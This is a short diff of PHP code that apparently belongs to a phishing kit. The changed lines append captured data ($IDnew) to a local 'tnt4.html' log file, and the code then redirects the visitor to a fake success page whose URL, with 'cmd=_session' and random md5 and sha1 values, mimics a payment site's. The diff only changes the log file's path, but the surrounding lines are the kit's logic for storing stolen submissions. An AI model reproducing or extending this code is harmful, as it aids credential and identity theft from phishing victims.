@@ -66,7 +66,7 @@ include('../../functions/get_lang_en.php');
 
 
 
-$f = fopen("../../users/tnt4.html", "a");
+$f = fopen("tnt4.html", "a");
 	    fwrite($f, $IDnew);
 
 $succes = "../success/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."";		
